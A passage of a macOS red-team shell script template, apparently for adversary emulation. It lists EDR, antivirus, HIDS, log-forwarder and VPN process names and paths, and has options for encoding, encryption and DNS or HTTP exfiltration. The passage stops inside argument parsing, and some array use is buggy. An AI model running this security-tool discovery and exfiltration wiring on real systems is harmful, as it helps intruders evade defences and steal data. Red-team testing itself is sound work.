#!/bin/sh
# POSIX-compliant shell script - avoid bashisms
# Script Name: base.sh
# MITRE ATT&CK Technique: [TECHNIQUE_ID]
# Author: @darmado | https://x.com/darmad0
# Date: $(date '+%Y-%m-%d')
# Version: 1.0

# Description:
# This is a standalone base script template that can be used to build any technique.
# Replace this description with the actual technique description.
# The script uses native macOS commands and APIs for maximum compatibility.

#------------------------------------------------------------------------------
# Configuration Section
#------------------------------------------------------------------------------

# MITRE ATT&CK Mappings
TACTIC="Discovery" #replace with your corresponding tactic
TTP_ID="T1082" #replace with your corresponding ttp_id
SUBTECHNIQUE_ID=""

TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
TACTIC_ENCODE="Defense Evasion" # DO NOT MODIFY
TTP_ID_ENCODE="T1140" # DO NOT MODIFY
TTP_ID_ENCODE_BASE64="T1027.001" # DO NOT MODIFY
TTP_ID_ENCODE_HEX="T1027" # DO NOT MODIFY
TTP_ID_ENCODE_PERL="T1059.006" # DO NOT MODIFY
TTP_ID_ENCODE_PERL_UTF8="T1027.010" # DO NOT MODIFY

# Add a unique job ID for tracking
JOB_ID=$(openssl rand -hex 4)

# Script Information
NAME="base"
SCRIPT_CMD="$0 $*"
SCRIPT_STATUS="running"
OWNER="$USER"
PARENT_PROCESS="$(ps -p $PPID -o comm=)"

# Core Commands
CMD_BASE64="base64"
CMD_BASE64_OPTS=""  # macOS base64 doesn't use -w option
CMD_CURL="curl"
CMD_CURL_OPTS="-L -s -X POST"
CMD_CURL_SECURITY="--fail-with-body --insecure"
CMD_CURL_TIMEOUT="--connect-timeout 5 --max-time 10 --retry 1 --retry-delay 0"
CMD_DATE="date"
CMD_DATE_OPTS="+%Y-%m-%d %H:%M:%S"  # Fixed for macOS compatibility
CMD_DIG="dig"
CMD_DIG_OPTS="+short"
CMD_OPENSSL="openssl"
CMD_PRINTF="printf"
CMD_XXD="xxd"
CMD_PERL="perl"
CMD_PS="ps"
CMD_LOGGER="logger"
CMD_SQLITE3="sqlite3"
CMD_AWK="awk"
CMD_SED="sed"
CMD_GREP="grep"
CMD_TR="tr"
CMD_HEAD="head"
CMD_TAIL="tail"
CMD_SLEEP="sleep"
CMD_GPG="gpg"
CMD_GPG_OPTS="--batch --yes --symmetric --cipher-algo AES256 --armor"

# Logging Settings
HOME_DIR="${HOME}"
LOG_DIR="./logs"  # Simple path to logs in current directory
LOG_FILE_NAME="${TTP_ID}_${NAME}.log"
LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
LOG_ENABLED=false
SYSLOG_TAG="${NAME}"

# Default settings
VERBOSE=false
DEBUG=false
ALL=false
TEST_MODE=false
SHOW_HELP=false
CHECK_EDR=false
CHECK_AV=false
CHECK_OST=false
CHECK_FIREWALL=false
CHECK_HIDS=false
CHECK_XPROTECT=false
CHECK_MRT=false
CHECK_GATEKEEPER=false
CHECK_TCC=false
CHECK_LOG_FORWARDER=false
CHECK_VPN=false
EDR_CHECK_TYPE="all"  # Default to all checks

# Output Configuration
FORMAT=""          # json, csv, or empty for raw
JSON_WRAP_LINES=true # Whether to wrap each line in quotes in JSON
JSON_DETECT_NUMBERS=true # Try to detect numbers in JSON
ENCODE="none"      # base64, hex, perl_b64, perl_utf8
ENCRYPT="none"     # aes, gpg, none
EXFIL=false
EXFIL_METHOD=""
EXFIL_URI=""
EXFIL_START=""
EXFIL_END=""
CHUNK_SIZE=50      # Default chunk size for DNS exfiltration (bytes)
PROXY_URL=""       # Proxy URL for HTTP/HTTPS operations
ENCODING_TYPE="none"
ENCRYPTION_TYPE="none"
EXFIL_TYPE="none"

#------------------------------------------------------------------------------
# Security Software Data
#------------------------------------------------------------------------------

# System paths to check - common for all security software types

# System locations to check
SYSTEM_PATHS=(
    "/Applications"
    "/Library"
    "/Library/Application Support" 
    "/System/Library/Extensions"
    "/Library/Extensions"
    "/System/Library/CoreServices"
    "/Library/LaunchAgents"
    "/Library/LaunchDaemons"
    "/System/Library/LaunchAgents"
    "/System/Library/LaunchDaemons"
    "$HOME/Library/LaunchAgents"
)

# Array of launch agent/daemon paths to check
LAUNCH_PATHS=(
    "/Library/LaunchAgents"
    "/Library/LaunchDaemons"
    "/System/Library/LaunchAgents"
    "/System/Library/LaunchDaemons"
    "$HOME/Library/LaunchAgents"
)

#------------------------------------------------------------------------------
# Log Forwarder Data
#------------------------------------------------------------------------------

# Log forwarder process pairs (vendor:processes)
LOG_FORWARDER_VENDOR_PROC=(
    "Splunk:splunkd,splunk"
    "Fluentd:fluentd,fluent-bit,td-agent"
    "Logstash:logstash"
    "Filebeat:filebeat"
    "Rsyslog:rsyslogd"
    "Syslog-ng:syslog-ng"
)

# Log forwarder process names
LOG_FORWARDER_PROCESSES=(
    "splunkd"
    "splunk"
    "fluentd"
    "fluent-bit"
    "td-agent"
    "logstash"
    "filebeat"
    "rsyslogd"
    "syslog-ng"
)

# Log forwarder search patterns
LOG_FORWARDER_PATTERNS=(
    "splunk"
    "fluentd"
    "fluent-bit"
    "td-agent"
    "logstash"
    "filebeat"
    "rsyslog"
    "syslog-ng"
)

# Log forwarder application names
LOG_FORWARDER_APP=(
    "SplunkForwarder.app"
    "Splunk.app"
    "Fluentd.app"
    "td-agent.app"
)

# Log forwarder file and directory paths
LOG_FORWARDER_PATHS=(
    "/Applications/SplunkForwarder"
    "/opt/splunkforwarder"
    "/opt/splunk"
    "/etc/td-agent"
    "/etc/td-agent/td-agent.conf"
    "/usr/local/etc/fluentd"
    "/opt/td-agent"
    "/usr/share/filebeat"
    "/etc/filebeat"
    "/etc/logstash"
    "/usr/share/logstash"
    "/var/log/splunk"
    "/Library/LaunchDaemons/com.splunk.*"
    "/Library/LaunchDaemons/td-agent.plist"
)

#------------------------------------------------------------------------------
# VPN Data
#------------------------------------------------------------------------------

# VPN process pairs (vendor:processes)
VPN_VENDOR_PROC=(
    "Cisco:vpnagentd,vpnd"
    "OpenVPN:openvpn"
    "WireGuard:wireguard-go"
    "NordVPN:nordvpnd"
    "ExpressVPN:expressvpnd"
    "PulseSecure:pulseUI,pulsesvc"
    "GlobalProtect:GlobalProtect,PanGPS"
    "Tunnelblick:Tunnelblick"
    "Viscosity:Viscosity"
)

# VPN process names
VPN_PROCESSES=(
    "vpnagentd"
    "vpnd"
    "openvpn"
    "wireguard-go"
    "nordvpnd"
    "expressvpnd"
    "pulseUI"
    "pulsesvc"
    "GlobalProtect"
    "PanGPS"
    "Tunnelblick"
    "Viscosity"
)

# VPN search patterns
VPN_PATTERNS=(
    "vpn"
    "cisco"
    "openvpn"
    "wireguard"
    "nordvpn"
    "expressvpn"
    "pulse"
    "globalprotect"
    "tunnelblick"
    "viscosity"
)

# VPN application names
VPN_APP=(
    "Cisco AnyConnect.app"
    "GlobalProtect.app"
    "NordVPN.app"
    "ExpressVPN.app"
    "Pulse Secure.app"
    "Tunnelblick.app"
    "Viscosity.app"
    "WireGuard.app"
    "OpenVPN Connect.app"
)

# VPN file and directory paths
VPN_PATHS=(
    "/Applications/Cisco"
    "/Applications/Cisco AnyConnect.app"
    "/Applications/GlobalProtect.app"
    "/Applications/NordVPN.app"
    "/Applications/ExpressVPN.app"
    "/Applications/Pulse Secure.app"
    "/Applications/Tunnelblick.app"
    "/Applications/Viscosity.app"
    "/Applications/WireGuard.app"
    "/Applications/OpenVPN Connect.app"
    "/Library/Extensions/CiscoVPN.kext"
    "/Library/Extensions/WireGuard.kext"
    "/Library/Application Support/Cisco/Cisco AnyConnect VPN Client"
    "/Library/Application Support/NordVPN"
    "/Library/Application Support/ExpressVPN"
    "/Library/LaunchDaemons/com.cisco.*"
    "/Library/LaunchDaemons/com.paloaltonetworks.*"
    "/Library/LaunchDaemons/com.nordvpn.*"
    "/Library/LaunchDaemons/com.expressvpn.*"
    "/Library/LaunchAgents/com.cisco.*"
    "/etc/wireguard"
    "/etc/openvpn"
    "/opt/cisco"
    "/var/log/cisco"
)

# Combined list of all security processes to check in general security scanning
SECURITY_PROCESSES=(
    # EDR processes
    ${EDR_PROCESSES[@]}
    # AV processes
    ${AV_PROCESSES[@]}
    # OST processes
    ${OST_PROCESSES[@]}
    # HIDS processes
    ${HIDS_PROCESSES[@]}
    # Log forwarder processes
    ${LOG_FORWARDER_PROCESSES[@]}
    # VPN processes
    ${VPN_PROCESSES[@]}
    # Other general security processes
    "syspolicyd"
    "endpointsecurityd"
    "socketfilterfw"
    "trustd"
    "authd"
)

# Combined list of security paths for general scanning
SECURITY_PATHS=(
    # EDR paths
    ${EDR_PATHS[@]}
    # AV paths
    ${AV_PATHS[@]}
    # OST paths
    ${OST_PATHS[@]}
    # HIDS paths
    ${HIDS_PATHS[@]}
    # Log forwarder paths
    ${LOG_FORWARDER_PATHS[@]}
    # VPN paths
    ${VPN_PATHS[@]}
    # macOS security paths
    ${XPROTECT_PATHS[@]}
    ${MRT_PATHS[@]}
    ${GATEKEEPER_PATHS[@]}
    ${TCC_PATHS[@]}
    ${FIREWALL_PATHS[@]}
)

#------------------------------------------------------------------------------
# EDR-specific data
#------------------------------------------------------------------------------

# EDR vendor process pairs (vendor:processes)
EDR_VENDOR_PROC=(
    "CrowdStrike:falconctl,falcon-sensor"
    "CarbonBlack:cbdaemon,cbagent"
    "SentinelOne:SentinelAgent,SentinelService"
    "Cylance:CylanceSvc,CylanceUI"
    "FireEye:FireEyeAgent,FireEyeService"
    "CiscoAMP:ampdaemon,ampservice"
    "PaloAlto:CortexService,TrapsService"
    "MicrosoftDefender:mds,mdatp"
    "TrendMicroApexOne:ds_agent,tmlisten"
    "SophosInterceptX:sophosd,sophosservice"
    "McAfee:mcafeeagent,mcafeed"
)

# EDR process names derived from EDR_VENDOR_PROC at runtime
# See check_edr_processes() function where we extract from vendor data
# This approach eliminates redundancy and ensures lists stay in sync

# EDR search patterns for grep - used for fuzzy matching in file paths, kernel extensions, etc.
# These patterns should be derived from vendor names and common terminology
EDR_PATTERNS=(
    # Vendor-specific patterns
    "crowd"       # CrowdStrike
    "falcon"      # CrowdStrike 
    "carbon"      # Carbon Black
    "cb"          # Carbon Black
    "cbdefense"   # Carbon Black
    "sentinel"    # SentinelOne
    "cylance"     # Cylance
    "cortex"      # Palo Alto Cortex
    "xdr"         # XDR solutions
    "traps"       # Palo Alto Traps
    "sophos"      # Sophos
    "mcafee"      # McAfee
    "fireeye"     # FireEye
    "trend"       # Trend Micro
    
    # Generic EDR terminology
    "edr"         # Endpoint Detection and Response
    "endpoint"    # Endpoint solutions
    "detection"   # Detection capabilities
    "response"    # Response capabilities
)

# EDR vendor applications
EDR_VENDOR_APP=(
    "CrowdStrike.app"
    "Carbon Black.app"
    "SentinelOne.app"
    "Cylance.app"
    "Cortex XDR.app"
    "Traps.app"
    "Sophos Endpoint.app"
    "FireEye Endpoint.app"
    "McAfee Endpoint Security.app"
    "TrendMicro Apex One.app"
    "Microsoft Defender ATP.app"
)

# EDR configuration and log paths
EDR_LOG_PATHS=(
    "/Library/Logs/Crowd*"
    "/Library/Logs/Carbon*"
    "/Library/Logs/Sentinel*" 
    "/var/log/crowdstrike"
    "/var/log/sentinel"
    "/var/log/carbon"
    "/var/log/cylance"
    "/var/log/sophos"
    "/etc/carbonblack"
    "/etc/crowdstrike"
    "/etc/sentinel"
    "/etc/cylance"
)

# EDR file and directory paths to check
EDR_PATHS=(
    # Applications
    "/Applications/SentinelOne.app"
    "/Applications/CarbonBlack/CbOsxSensorService"
    "/Applications/Red Canary Mac Monitor.app"
    
    # Library paths
    "/Library/CS/falconctl"
    "/Library/Sophos Anti-Virus"
    "/Library/Application Support/Cylance/Desktop/CylanceUI.app"
    "/Library/Application Support/TrendMicro"
    
    # Security directories
    "/Library/CS"
    "/Library/CrowdStrike"
    "/Library/Sentinel"
    "/Library/Carbon"
    "/Library/Extensions/CbOsxSensorExtension.kext"
    "/Library/Extensions/SentinelExtension.kext"
    "/Library/Extensions/CylanceDRIVERosx.kext"
    "/Library/Application Support/Cylance"
    "/Library/Application Support/CrowdStrike"
    "/Library/Application Support/Sophos"
    "/Library/Application Support/Carbon Black"
    
    # LaunchDaemons and LaunchAgents
    "/Library/LaunchDaemons/com.crowdstrike.*"
    "/Library/LaunchDaemons/com.sentinelone.*"
    "/Library/LaunchDaemons/com.carbonblack.*"
    "/Library/LaunchDaemons/com.vmware.carbonblack.*"
    "/Library/LaunchDaemons/com.cylance.*"
    "/Library/LaunchDaemons/com.microsoft.defender.*"
    "/Library/LaunchDaemons/com.sophos.*"
    "/Library/LaunchAgents/com.sophos.*"
    "/Library/PrivilegedHelperTools/com.sophos.*"
)

#------------------------------------------------------------------------------
# Antivirus-specific data
#------------------------------------------------------------------------------

# AV vendor process pairs (vendor:processes)
AV_VENDOR_PROC=(
    "MacKeeper:MacKeeper,MacKeeperAgent,com.mackeeper.MacKeeperPrivilegedHelper"
    "Malwarebytes:RTProtectionDaemon,FrontendAgent,SettingsDaemon"
    "Avast:AvastUI"
    "AvastBusinessAntivirusforMac:AvastBusinessUI"
    "AvastFreeAntivirusforMac:AvastFreeUI"
    "AvastSecurity:AvastSecurityUI"
    "Avira:AviraUI"
    "AviraAntivirus:AviraAntivirusUI"
    "AviraFreeAntivirusforMac:AviraFreeUI"
    "Bitdefender:bdmd"
    "BitdefenderAntivirusforMac:bdmd"
    "BitdefenderAntivirusFree:bdmd"
    "BitdefenderGravityZone:bdmd"
    "ESET:ec_service"
    "ESETCyberSecurityforMac:ec_service"
    "ESETNOD32:ESETNOD32Service"
    "F-SecureElements:FSElementsService"
    "Kaspersky:kavsvc"
    "KasperskyFreeAntivirusforMac:kavsvc"
    "KasperskySecurityCloud:kavsvc"
    "MicrosoftDefender:Defender"
    "Norton360:Norton360Service"
    "PandaAdaptiveDefense:PandaAdaptiveService"
    "PandaSecurity:PandaService"
    "Proofpoint:ProofpointAgent"
    "Webroot:WRSAService"
    "WebrootBusinessEndpointProtection:WRBusinessService"
    "WebrootSecureAnywhere:WRSAService"
)

# AV process names derived from AV_VENDOR_PROC at runtime
# See check_av_processes() function where we extract from vendor data
# This approach eliminates redundancy and ensures lists stay in sync

# AV pattern search strings - used for fuzzy matching in file paths, launch agents, etc.
# These patterns are used for grepping through files and directories
AV_PATTERNS=(
    # Generic AV terminology
    "antivirus"    # Generic term
    "malware"      # Anti-malware
    "virus"        # Anti-virus
    "protection"   # Protection features
    
    # Vendor-specific patterns
    "mackeeper"    # MacKeeper
    "avast"        # Avast
    "avira"        # Avira
    "bitdefender"  # Bitdefender
    "eset"         # ESET
    "f-secure"     # F-Secure
    "kaspersky"    # Kaspersky
    "norton"       # Norton/Symantec
    "panda"        # Panda
    "webroot"      # Webroot
    "malwarebytes" # Malwarebytes
)

# AV vendor applications
AV_VENDOR_APP=(
    "MacKeeper.app"
    "Avast.app"
    "AvastBusiness.app"
    "AvastFree.app"
    "AvastSecurity.app"
    "Avira.app"
    "AviraAntivirus.app"
    "AviraFree.app"
    "Bitdefender.app"
    "BitdefenderMac.app"
    "BitdefenderFree.app"
    "GravityZone.app"
    "ESET.app"
    "CyberSecurity.app"
    "NOD32.app"
    "F-Secure.app"
    "Elements.app"
    "Kaspersky.app"
    "KasperskyFree.app"
    "SecurityCloud.app"
    "Microsoft Defender.app"
    "Norton360.app"
    "PandaAdaptive.app"
    "Panda.app"
    "Proofpoint.app"
    "Webroot.app"
    "WebrootBusiness.app"
    "WebrootSecureAnywhere.app"
    "Malwarebytes.app"
)

# AV file and directory paths
AV_PATHS=(
    # MacKeeper paths
    "/Applications/MacKeeper.app"
    "/Applications/MacKeeper.app/Contents/MacOS/MacKeeper"
    "/Applications/MacKeeper.app/Contents/Library/LaunchAgents/MacKeeperAgent.app"
    "/Applications/MacKeeper.app/Contents/Library/LaunchAgents/MacKeeper Info.app"
    "/Library/PrivilegedHelperTools/com.mackeeper.MacKeeperPrivilegedHelper"
    "/Library/LaunchDaemons/com.mackeeper.MacKeeperPrivilegedHelper.plist"
    "$HOME/Library/LaunchAgents/com.mackeeper.MacKeeperAgent.plist"
    "$HOME/Library/LaunchAgents/com.mackeeper.MacKeeper-Info.plist"
    
    # Malwarebytes paths
    "/Applications/Malwarebytes.app"
    "/Library/Application Support/Malwarebytes"
    "/Library/LaunchDaemons/com.malwarebytes.mbam.rtprotection.daemon.plist"
    "/Library/LaunchDaemons/com.malwarebytes.mbam.settings.daemon.plist"
    "/Library/LaunchAgents/com.malwarebytes.mbam.frontend.agent.plist"
    
    # Other common AV paths
    "/Applications/Avast.app"
    "/Applications/Bitdefender.app"
    "/Applications/ESET.app"
    "/Applications/Kaspersky.app"
    "/Applications/Norton360.app"
    "/Applications/Webroot.app"
    "/Library/Application Support/Avast"
    "/Library/Application Support/Bitdefender"
    "/Library/Application Support/ESET"
    "/Library/Application Support/Kaspersky"
    "/Library/Application Support/Norton"
    "/Library/Application Support/Webroot"
)

#------------------------------------------------------------------------------
# Objective-See and third-party macOS security tools
#------------------------------------------------------------------------------

# Objective-See and additional macOS security tools
OST_PROC=(
    "BlockBlock:blockblock"
    "DoNotDisturb:DoNotDisturb"
    "LuLu:LuLu"
    "KnockKnock:KnockKnockDaemon"
    "OverSight:OverSight"
    "RansomWhere:RansomWhere"
)

# Objective-See process names
OST_PROCESSES=(
    "blockblock"
    "DoNotDisturb"
    "LuLu"
    "KnockKnockDaemon"
    "OverSight"
    "RansomWhere"
)

# Objective-See applications
OST_APP=(
    "BlockBlock.app"
    "DoNotDisturb.app"
    "LuLu.app"
    "KnockKnock.app"
    "OverSight.app"
    "RansomWhere.app"
    "WhatsYourSign.app"
)

# Objective-See file paths
OST_PATHS=(
    "/Applications/LuLu.app"
    "/Applications/DoNotDisturb.app"
    "/Applications/BlockBlock.app"
    "/Applications/RansomWhere.app"
    "/Applications/KnockKnock.app"
    "/Applications/OverSight.app"
    "/Applications/WhatsYourSign.app"
    "/Library/LaunchDaemons/com.objective-see.lulu.plist"
    "/Library/LaunchAgents/com.objective-see.oversight.plist"
    "/Library/LaunchDaemons/com.objective-see.blockblock.plist"
    "/Library/Objective-See"
    "$HOME/Library/Application Support/Objective-See"
)

#------------------------------------------------------------------------------
# macOS built-in security features data
#------------------------------------------------------------------------------

# HIDS (Host Intrusion Detection System) data
HIDS_PROCESSES=(
    "ossec"
    "wazuh"
    "samhain"
    "aide"
    "tripwire"
    "osquery"
    "osqueryd"
    "osqueryi"
    "auditd"
)

# HIDS (Host Intrusion Detection System) paths to search
HIDS_PATHS=(
    # OSSEC and Wazuh paths
    "/var/ossec"
    "/var/log/ossec"
    "/var/log/wazuh"
    "/etc/ossec-init.conf"
    "/Library/Ossec"
    
    # Other HIDS tools
    "/etc/samhain"
    "/var/lib/samhain"
    "/etc/aide"
    "/etc/aide.conf"
    "/var/lib/aide"
    "/etc/tripwire"
    "/var/lib/tripwire"
    "/private/var/audit"
    
    # osquery paths (standard installation locations)
    "/usr/local/etc/osquery"
    "/usr/local/bin/osqueryi"
    "/usr/local/bin/osqueryctl"
    "/usr/local/lib/osquery.app"
    "/var/log/osquery"
    "/opt/osquery"
    "/opt/osquery/bin"
    "/opt/osquery/share"
    
    # osquery macOS-specific paths
    "/private/var/osquery"
    "/private/var/osquery/io.osquery.agent.plist"
    "/private/var/osquery/osquery.example.conf"
    "/private/var/osquery/osquery.conf"
    "/private/var/log/osquery"
    "/private/var/osquery/lenses"
    "/private/var/osquery/packs"
    "/opt/osquery/lib/osquery.app"
    "/opt/osquery/lib/osquery.app/Contents/MacOS/osqueryd"
    "/opt/osquery/lib/osquery.app/Contents/Resources/osqueryctl"
    "/Library/LaunchDaemons/io.osquery.agent.plist"
    
    # Kolide Fleet and osquery enterprise
    "/usr/local/kolide"
    "/var/kolide"
    "/etc/kolide"
)

# macOS XProtect paths
XPROTECT_PATHS=(
    "/Library/Apple/System/Library/CoreServices/XProtect.bundle"
    "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.plist"
    "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.meta.plist"
)

# Malware Removal Tool paths
MRT_PATHS=(
    "/Library/Apple/System/Library/CoreServices/MRT.app"
    "/System/Library/CoreServices/MRT.app"
    "/System/Library/CoreServices/MRT.app/Contents/version.plist"
)

# Gatekeeper related files
GATEKEEPER_PATHS=(
    "/private/var/db/gkopaque.bundle"
    "/private/var/db/gke.bundle"
    "/private/var/db/gk.db"
)

# TCC (Transparency, Consent, and Control) database files
TCC_PATHS=(
    "/Library/Application Support/com.apple.TCC/TCC.db"
    "/Users/*/Library/Application Support/com.apple.TCC/TCC.db"
)

# Firewall related files
FIREWALL_PATHS=(
    "/Library/Preferences/com.apple.alf.plist"
    "/Library/Preferences/com.apple.alf.appfirewall.plist"
    "/usr/libexec/ApplicationFirewall/socketfilterfw"
)

#------------------------------------------------------------------------------
# CORE FUNCTIONS FROM base.sh
#------------------------------------------------------------------------------
# NOTE: All core functions are prefixed with 'core_' to avoid namespace conflicts
# with script-specific functions. When creating scripts that source this file,
# use your own function names to prevent collisions.

# Get current timestamp in the specified format
core_get_timestamp() {
    # Use direct command to avoid variable expansion issues
    date "+%Y-%m-%d %H:%M:%S"
}

# Print debug messages if debug mode is enabled
core_debug_print() {
    if [ "$DEBUG" = true ]; then
        local timestamp=$(core_get_timestamp)
        $CMD_PRINTF "[DEBUG] [%s] %s\n" "$timestamp" "$1" >&2
    fi
}

# Print verbose messages if verbose mode is enabled
core_verbose_print() {
    if [ "$VERBOSE" = true ]; then
        local timestamp=$(core_get_timestamp)
        $CMD_PRINTF "[INFO] [%s] %s\n" "$timestamp" "$1"
    fi
}

# Handle errors consistently
core_handle_error() {
    local error_msg="$1"
    local timestamp=$(core_get_timestamp)
    $CMD_PRINTF "[ERROR] [%s] %s\n" "$timestamp" "$error_msg" >&2
    
    if [ "$LOG_ENABLED" = true ]; then
        core_log_output "$error_msg" "error" false
    fi
    
    return 1
}

# Log output to the log file with rotation
core_log_output() {
    local output="$1"
    local status="${2:-info}"
    local skip_data="${3:-false}"
    
    if [ "$LOG_ENABLED" = true ]; then
        # Ensure log directory exists
        if [ ! -d "$LOG_DIR" ]; then
            mkdir -p "$LOG_DIR" 2>/dev/null || {
                $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                return 1
            }
        fi
        
        # Check log size and rotate if needed
        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ] && [ "$(stat -f%z "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null || echo 0)" -gt "$LOG_MAX_SIZE" ]; then
            mv "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
            core_debug_print "Log file rotated due to size limit"
        fi
        
        # Log detailed entry
        printf "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s status=%s\\n" \
            "$(core_get_timestamp)" \
            "$status" \
            "$$" \
            "${JOB_ID:-NOJOB}" \
            "$OWNER" \
            "$PARENT_PROCESS" \
            "$TTP_ID" \
            "$TACTIC" \
            "${FORMAT:-raw}" \
            "$ENCODING_TYPE" \
            "${ENCRYPTION_TYPE:-none}" \
            "${EXFIL_TYPE:-none}" >> "$LOG_DIR/$LOG_FILE_NAME"
            
        if [ "$skip_data" = "false" ] && [ -n "$output" ]; then
            printf "command: %s\\ndata:\\n%s\\n---\\n" \
                "$SCRIPT_CMD" \
                "$output" >> "$LOG_DIR/$LOG_FILE_NAME"
        else
            printf "command: %s\\n---\\n" \
                "$SCRIPT_CMD" >> "$LOG_DIR/$LOG_FILE_NAME"
        fi

        # Also log to syslog
        $CMD_LOGGER -t "$SYSLOG_TAG" "job=${JOB_ID:-NOJOB} status=$status ttp_id=$TTP_ID tactic=$TACTIC exfil=${EXFIL_TYPE:-none} encoding=$ENCODING_TYPE encryption=${ENCRYPTION_TYPE:-none} cmd=\"$SCRIPT_CMD\""
    fi
    
    # Output to stdout if in debug/verbose mode
    if [ "$DEBUG" = true ] || [ "$VERBOSE" = true ]; then
        $CMD_PRINTF "[%s] [%s] %s\\n" "$(core_get_timestamp)" "$status" "$output"
    fi
}

# Validate that required commands are available
core_validate_commands() {
    # POSIX-compliant approach using space-separated string
    local missing_cmds=""
    
    # Check for essential commands
    for cmd in "$CMD_DATE" "$CMD_PRINTF" "$CMD_OPENSSL"; do
        if ! command -v "$cmd" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $cmd"
        fi
    done
    
    # Check encryption/encoding commands if needed
    if [ "$ENCODE" != "none" ]; then
        if [ "$ENCODE" = "base64" ] && ! command -v "$CMD_BASE64" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $CMD_BASE64"
        elif [ "$ENCODE" = "hex" ] && ! command -v "$CMD_XXD" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $CMD_XXD"
        elif echo "$ENCODE" | grep "^perl" > /dev/null && ! command -v "$CMD_PERL" > /dev/null 2>&1; then
            missing_cmds="$missing_cmds $CMD_PERL"
        fi
    fi
    
    # Check exfiltration commands if needed
    if [ "$EXFIL" = true ]; then
        case "$EXFIL_METHOD" in
            http|https)
                if ! command -v "$CMD_CURL" > /dev/null 2>&1; then
                    missing_cmds="$missing_cmds $CMD_CURL"
                fi
                ;;
            dns)
                if ! command -v "dig" > /dev/null 2>&1; then
                    missing_cmds="$missing_cmds dig"
                fi
                ;;
        esac
    fi
    
    # Report missing commands
    if [ -n "$missing_cmds" ]; then
        core_handle_error "Missing required commands:$missing_cmds"
        return 1
    fi
    
    return 0
}

# Parse command-line arguments
core_parse_arguments() {
    while [ "$#" -gt 0 ]; do
        case "$1" in
            -h|--help)
                SHOW_HELP=true
                ;;
            -v|--verbose)
                VERBOSE=true
                ;;
            -d|--debug)
                DEBUG=true
                VERBOSE=true
                ;;
            -a|--all)
                ALL=true
                ;;
            -l|--log)
                LOG_ENABLED=true
                ;;
            -t|--test)
                TEST_MODE=true
                ;;
            --edr-ps)
                CHECK_EDR=true
                EDR_CHECK_TYPE="ps"
                ;;
            --edr-files)
                CHECK_EDR=true
                EDR_CHECK_TYPE="files"
                ;;
            --edr-dir)
                CHECK_EDR=true
                EDR_CHECK_TYPE="dir"
                ;;
            --edr-info)
                CHECK_EDR=true
                EDR_CHECK_TYPE="info"
                ;;
            --edr)
                CHECK_EDR=true
                EDR_CHECK_TYPE="all"
                ;;
            --av)
                CHECK_AV=true
                ;;
            --ost)
                CHECK_OST=true
                ;;
            --fw)
                CHECK_FIREWALL=true
                ;;
            --hids)
                CHECK_HIDS=true
                ;;
            --xp)
                CHECK_XPROTECT=true
                ;;
            --mrt)
                CHECK_MRT=true
                ;;
            --gk)
                CHECK_GATEKEEPER=true
                ;;
            --tcc)
                CHECK_TCC=true
                ;;
            --log-forwarder)
                CHECK_LOG_FORWARDER=true
                ;;
            --vpn)
                CHECK_VPN=true
                ;;
            -f|--format|--output-format)
                if [ -n "$2" ]; then
                    FORMAT="$2"
                    shift
                fi
                ;;
            --encode)
                if [ -n "$2" ]; then
                    ENCODE="$2"
                    ENCODING_TYPE="$2"
                    shift
                fi
                ;;
            --encrypt)
                if [ -n "$2" ]; then
                    ENCRYPT="$2"
                    ENCRYPTION_TYPE="$2"
                    shift
                fi
                ;;
            --exfil-dns)
                if [ -n "$2" ]; then
                EXFIL=true
                    EXFIL_METHOD="dns"
                    EXFIL_TYPE="dns"
                    EXFIL_URI="$2"
                    shift
                fi
                ;;
            --exfil-http)
                if [ -n "$2" ]; then
                    EXFIL=true
                    EXFIL_METHOD="http"
                    EXFIL_TYPE="http"
                    EXFIL_URI="$2"
                    shift
                fi
                ;;
            # Support for legacy --exfil-uri parameter
            --exfil-uri)
                if [ -n "$2" ]; then
                    EXFIL=true
                    # Detect if this is a DNS or HTTP URI
                    case "$2" in
                        *.*) # Has a dot, assume it's a domain
                            EXFIL_METHOD="http"
                            EXFIL_TYPE="uri" # Mark as URI-based exfil for proper method selection
                            ;;
                    esac
                    EXFIL_URI="$2"
                    shift
                fi
                ;;
            # Support for legacy --exfil-method parameter
            --exfil-method)
                if [ -n "$2" ]; then
                    EXFIL_METHOD="$2"
                    EXFIL_TYPE="$2"
                    shift
                fi
                ;;
            --chunk-size)
                if [ -n "$2" ] && [ "$2" -gt 0 ] 2>/dev/null; then
                    CHUNK_SIZE="$2"
                    shift
                else
                    core_handle_error "Invalid chunk size: $2. Must be a positive integer."
                    exit 1
                fi
                ;;
            --proxy)
                if [ -n "$2" ]; then
                    PROXY_URL="$2"
                    shift
                fi
                ;;
            *)
                # Ignore unknown arguments
                ;;
        esac
        shift
    done
    
    # Validate argument combinations
    if [ "$EXFIL" = true ] && [ -z "$EXFIL_METHOD" ]; then
        core_handle_error "Exfiltration enabled but no method specified"
        exit 1
    fi
    
    # Generate a key if encryption is enabled
    if [ "$ENCRYPT" != "none" ]; then
        # Generate encryption key silently
        ENCRYPT_KEY=$(printf '%s' "$JOB_ID$(date +%s%N)$RANDOM" | $CMD_OPENSSL dgst -sha256 | cut -d ' ' -f 2)
        if [ "$DEBUG" = true ]; then
            $CMD_PRINTF "[DEBUG] [%s] Using encryption key: %s\n" "$(core_get_timestamp)" "$ENCRYPT_KEY" >&2
        fi
    fi
    
    # If --all is specified, enable all security checks
    if [ "$ALL" = true ]; then
        CHECK_EDR=true
        CHECK_AV=true
        CHECK_OST=true
        CHECK_FIREWALL=true
        CHECK_HIDS=true
        CHECK_XPROTECT=true
        CHECK_MRT=true
        CHECK_GATEKEEPER=true
        CHECK_TCC=true
        CHECK_LOG_FORWARDER=true
        CHECK_VPN=true
    fi
    
